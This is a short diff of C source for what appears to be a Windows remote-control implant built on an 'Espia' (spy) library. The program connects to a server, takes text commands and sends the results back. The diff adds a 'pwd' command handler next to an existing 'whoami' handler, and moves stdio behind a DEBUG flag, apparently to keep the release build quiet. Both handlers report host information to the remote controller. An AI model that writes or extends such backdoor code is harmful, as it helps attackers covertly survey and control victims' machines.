@@ -1,10 +1,13 @@
-#ifndef WIN32_LEAN_AND_MEAN
-#define WIN32_LEAN_AND_MEAN
+#include "Espia/includes/espia.h"
+
+#ifndef WINDOWS_H
+#define WINDOWS_H
+#include <windows.h> 
 #endif
 
-#include <windows.h> 
+#if DEBUG
 #include <stdio.h>
-#include "Espia/includes/espia.h"
+#endif
 
 #define TRY_SERVER 5
 #define BUFF_SIZE 1024
@@ -39,6 +42,11 @@ int main() {
             memset(whoami_buff, 0, sizeof(whoami_buff));
             whoami(whoami_buff, sizeof(whoami_buff));
             espia_send(&connection, whoami_buff, sizeof(whoami_buff));
+        } else if (strcmp(recv_buff, "pwd") == 0) {
+            WCHAR pwd_buff[MAX_PATH + 1];
+            memset(pwd_buff, 0, sizeof(pwd_buff));
+            pwd(pwd_buff, sizeof(pwd_buff));
+            espia_send(&connection, pwd_buff, sizeof(pwd_buff));
         }
 
     }
